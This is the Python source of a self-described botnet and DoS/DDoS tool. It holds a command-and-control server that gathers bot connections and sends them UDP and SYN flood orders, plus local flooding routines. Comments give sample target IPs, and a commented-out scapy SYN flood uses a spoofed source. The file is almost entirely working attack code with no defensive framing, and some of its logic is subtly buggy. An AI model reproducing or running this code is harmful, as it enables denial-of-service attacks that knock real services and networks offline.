from scapy.all import *
from threading import Thread
from time import sleep
import ctypes, socket, sys
import platform, signal
from random import choice
from typing import Union, Tuple


class Colours:
	def __init__(self): 
		COMMANDS = {
			# Lables
			'info': (33, '[!] '),
			'que': (34, '[?] '),
			'bad': (31, '[-] '),
			'good': (32, '[+] '),
			'run': (97, '[~] '),
			# Colors
			'green': 32,
			'lgreen': 92,
			'lightgreen': 92,
			'grey': 37,
			'black': 30,
			'red': 31,
			'lred': 91,
			'lightred': 91,
			'cyan': 36,
			'lcyan': 96,
			'lightcyan': 96,
			'blue': 34,
			'lblue': 94,
			'lightblue': 94,
			'purple': 35,
			'yellow': 93,
			'white': 97,
			'lpurple': 95,
			'lightpurple': 95,
			'orange': 33,
			# Styles
			'bg': ';7',
			'bold': ';1',
			'italic': '3',
			'under': '4',
			'strike': '09',
		}
		for key, val in COMMANDS.items():
			value = val[0] if isinstance(val, tuple) else val
			prefix = val[1] if isinstance(val, tuple) else ''
			locals()[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)
			self.__dict__[key] = lambda s, prefix=prefix, key=value: self._gen(s, prefix, key)

	def _gen(self,string, prefix, key):
		colored = prefix if prefix else string
		not_colored = string if prefix else ''
		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
		return result



class Server(Colours): # this class is create a server to control botnet

	co=["green","lgreen","lightgreen","grey","red","lred","lightred","cyan","lcyan","lightcyan","blue","lblue","lightblue","purple","yellow","white","lpurple","lightpurple","orange"]
	run = False
	def __init__(self):
		super().__init__()
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.print_logo()
		self.run = False
		# self.all_connections = []
		# self.all_address = []
		# self.stop = False
		# if self._bind(connect):
		# 	while True:
		# 		self._take_cmd()

	def _starting(self,connect:Tuple[str,int]=("0.0.0.0",9999)):
		self.all_connections = []
		self.all_address = []
		self.stop = False
		if self._bind(connect):
			while True:
				self._take_cmd()

	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""): # close all connection and shut down the server
		print("\nExiting....")
		self.stop = True
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _bind(self, connect:Tuple[str,int]) -> bool:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.bind(connect)
		self.sock.listen(50)
		self.sock.settimeout(0.5)
	
		Thread(target=self.collect).start() #create thread to collect the ip address and connection after adding 1 client
		Thread(target=self.check).start() #create thread to check the status of client.

		return True

	def print_logo(self) -> None:
		menu = ("Python Botnet and DoS/DDoS \n"
				"\t1. Botnet and DDoS attack tool\n"
				"\t2. DoS attack tool\n"
				"\tWhich option you want to choose.\n")
		print(menu)
		sleep(0.1)
		check = True
		while check:
			choose = input()
			choose = int(choose)
			if choose == 1:
				self._starting()
				check = False
			elif choose == 2:
				self.dos_attack()
				check = False
			else:
				print("Invalid Options")
				check = True
		choose1 = input("Do you want to continue ?Y/N")
		if choose1 == "Y" or choose1 == "y":
			self.print_logo()
		else:
			sys.exit()


	# def print_logo(self) -> None:
	# 	x =b"\n\n\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n                  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \n                  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \n                                                                                              \n\n"
	# 	for n in x.decode().split("\n"):
	# 		print((n))
	# 		sleep(0.1)
	
	def _print_help(self):
		help = ("attack udp <ip> <port> <time in second> <thread>\n"
				"attack syn <ip> <port> <time in second> <thread>\nOptions:\n"
				"\tping			To check status of the server (Die or Live)\n"
				"\tkill			To stop all servers\n"
				"\tlist			Show the list of live client\n"
				"\tupdate			Update the new client has connect to server\n"
				"\texit or quit 	For quiting/exiting\n")
		print(help)
	def collect(self):
		while not self.stop:
			try:
				conn, address = self.sock.accept() #accept coming connection from TCP client
				self.all_connections.append(conn)
				self.all_address.append(address)
			except socket.timeout: #exception if socket connection timeout, the code will continue
				continue
			except socket.error: #exception if socket error
				continue
			except Exception as e: #print the error.
				print("Error accepting connections")

	# this function is created to for the user choose the option to perform the ddos attack or update the new connection to the server.
	def _take_cmd(self):
		cmd=input("->>").strip()
		if cmd:
			if cmd == "list":
				results = ''
				for i, (ip, port) in enumerate(self.all_address): #print the list of ip has connect to server. This function show the list of ip, port and the index.
					results = results+self.__dict__[choice(self.co)](f'{[i]}    {ip}:{port}    CONNECTED\n')
				print("----Clients----" + "\n" + results)
			elif cmd == "help": # this function will print how to use function in this program.
				self._print_help()
			elif cmd == "update": #this function will call the update function
				self.check(display=True,always=False)
			elif cmd in ["exit","quit"]:#This function will end this program.
				self.exit_gracefully()
			elif "attack" in cmd: #attack function.
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode()) #send the attack has been encode commmnand to client and the client invoke the attack.
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}')) #This line is response the information from the client to the server.
					except BrokenPipeError: # if something happen with the socket connection between the client and server, we will delet the connection between them and the ip address.
						del self.all_address[i]
						del self.all_connections[i]
			elif cmd == "ping" or "kill":
				for i, (ip, port) in enumerate(self.all_address):
					try:
						self.all_connections[i].send(cmd.encode()) # the same with attack cmd
						print(self.__dict__[choice(self.co)](f'[+]    {ip}:{port}    {self.all_connections[i].recv(1024*5).decode("ascii")}'))
					except BrokenPipeError:
						del self.all_address[i]
						del self.all_connections[i]


	def check(self, display:bool=False, always:bool=True): #this function will check the status of the connection between the client and the server after connect.
		while not self.stop:
			c=0
			for n,tcp in zip(self.all_address,self.all_connections): #get all ip address and connection.
				c+=1
				try:
					tcp.send(str.encode("ping")) # the server try to send the command ping to the client and encode the "ping" command
					if tcp.recv(1024).decode("utf-8") and display:
							print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    LIVE'))
				except:
					if display == False: #check the status of the client if out of time or end session, this code will erase the connection and the ip address
						print(self.__dict__[choice(self.co)](f'[+]    {str(n[0])+":"+str(n[1])}    DEAD'))
					del self.all_address[c-1]
					del self.all_connections[c-1]
					continue
			if not always:
				break
			
			sleep(0.5)
	def dos_attack(self):
		#input target IP and Port

		def _dos_attack_syn(destination_IP, destination_port, time:int):
			BUFFER_SIZE = 60000
			BUFFER_SIZE = bytes(BUFFER_SIZE)
			i = 1
			destination_port = int(destination_port)
			# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			# s.connect((destination_IP, destination_port))
			while True:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((destination_IP, destination_port))
				s.sendto(BUFFER_SIZE,(destination_IP, destination_port))
				print("Sent Packet: ", i)
				i = i + 1


		def _dos_attack_udp(destination_IP, destination_port, time:int):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			bytes = random._urandom(3)  # random the size of udp packet .
			s.connect((destination_IP, int(destination_port)))
			while True:
				if not self.run: break
				#s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				#s.connect((destination_IP, int(destination_port)))
				s.sendto(bytes, (destination_IP, int(destination_port)))

			s.close()

		help = "DoS with SYN Flood: attack dos syn <ip> <port> <time in second> <Thread>\n" + "DoS with UDP Flood: attack dos udp <ip> <port> <time in second> <Thread>\n"
		print(help)
		cmd = input("->>")
		if "syn" in cmd:
			#attack dos syn 27.64.57.85 1005 200 5000
			#attack dos syn 192.168.1.48 443 200 5000
			data = cmd.replace("attack dos syn ","").split(" ")
			print(data)
			ip, port, times, thread = data
			data = ip, int(port), int(times), int(thread)
			print(type(ip))
			self.run = True
			for a in range(int(thread)):
				_dos_attack_syn(ip, port, times)
			self.run = False
		elif "udp" in cmd:
			#attack dos udp 27.64.57.85 1005 200 5000
			# attack dos udp 192.168.1.48 443 200 5000
			data = cmd.replace("attack dos udp ", "").split(" ")
			print(data)
			ip, port, times, thread = data
			data = ip, int(port), int(times), int(thread)
			print(type(ip))
			self.run = True
			for a in range(int(thread)):
				Thread(target=_dos_attack_udp, args= (ip, port, times)).start()
				#print(threading.enumerate())
			self.run = False
			# Thread(target=_dos_attack_udp, args=(ip, port, times)).start()
			# self.run = False


		# destination_IP = input("Enter IP address of Target: ")
		# destination_port = int(input("Enter port of the target: "))

		# i = 1
		# while True:
		# 	#IP1 = IP(source_IP="192.168.1.48", destination="192.168.1.47")
		# 	#TCP1 = TCP(srcport="80", dstport=80)
		# 	send(IP(src="192.168.1.48", dst=destination_IP)/TCP(sport=80, dport=destination_port),loop=0,inter=0.0000001)
		# 	#send(IP(dst=target_IP)/TCP(dport=target_Port, flags="S"),loop=0,inter=0.0000001) #send tcp packet to target.
		# 	print("packet sent ", i)
		# 	i = i + 1





if __name__ == '__main__':
	Server()
